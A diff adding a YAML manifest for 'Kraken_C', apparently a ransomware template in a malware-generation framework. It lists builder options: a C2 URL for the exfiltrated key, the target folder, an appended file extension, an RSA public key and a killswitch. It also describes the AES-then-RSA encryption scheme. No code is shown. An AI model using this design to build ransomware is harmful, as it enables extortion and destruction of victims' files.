@@ -1,0 +1,36 @@
+name: "Kraken_C"
+lang: "c"
+malware_type: "Ransomware"
+description: "A basic ransomware that generate an AES key, encrypt files, then encrypt the key using RSA and a base64 encoded public key and send the key with some basic metadata to a C2 URL using POST"
+template: "templates/base/kraken.c.j2"
+features:
+  - name: c2_url
+    description: "the URL where the key and some metadata will be sent"
+    type: "string"
+    mandatory: True
+    default: ""
+  - name: malware_key
+    description: "key to identify which malware has send the data to the C2, used by Scylla"
+    type: "string"
+    mandatory: False
+    default: "Release-the-KRAKEN(butinC)"
+  - name: folder_path
+    description: "the path where the file will be encrypted, use onlu / or double \\"
+    type: "string"
+    mandatory: True
+    default: ""
+  - name: file_extension
+    description: "the file extension (without the '.') that will be appended to the files"
+    type: "string"
+    mandatory: False
+    default: "kraken"
+  - name: rsa_public_key_der
+    description: "the location for the RSA public key in DER format"
+    type: "string"
+    mandatory: True
+    default: ""
+  - name: activate_killswitch
+    description: "activate the cross killswitch"
+    type: "bool"
+    mandatory: False
+    default: "False"
